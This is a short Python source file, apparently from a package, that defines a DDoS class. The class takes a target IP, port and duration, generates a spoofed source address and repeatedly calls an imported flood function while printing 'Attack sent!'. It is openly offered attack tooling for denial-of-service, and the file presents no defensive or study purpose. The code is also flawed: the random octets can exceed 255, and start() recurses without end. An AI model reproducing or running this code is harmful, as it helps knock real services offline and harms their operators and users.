import random
from .utilities.ddos_utils import ddos_util
from .errors import *

class DDoS:
    r"""A class that implements DDoS function
    -----------
    Parameters :
    - IP: :class:`str` | Set target IP
    - PORT: :class:`int` | Set target PORT (Default : 80)
    - duration: :class:`int` | Set DDoS duration (Default : 120) 
    """

    def __init__(self, IP: str, PORT:int=80, duration:int=120):
        invalid_ip = ["https://", "http://"]

        ip1 = random.randint(100, 999)
        ip2 = random.randint(10, 999)
        ip3 = random.randint(10, 999)
        ip4 = random.randint(10, 999)
        self.fake_ip = f"{ip1}.{ip2}.{ip3}.{ip4}"
        self.duration = duration

        if any(v in IP for v in invalid_ip):
            raise InvalidIP

        self.IP = IP
        self.PORT = PORT
     
    def start(self, output=False):
        r"""
        Start DDoS
        -----
        Parameter :
        - output: `True/False` | Print DDoS output (Default : False)
        """

        for i in range(self.duration):
            ddos_util(IP=self.IP, PORT=self.PORT, fake_ip=self.fake_ip)
            if output == True:
                print("Attack sent!")
                
        self.start()
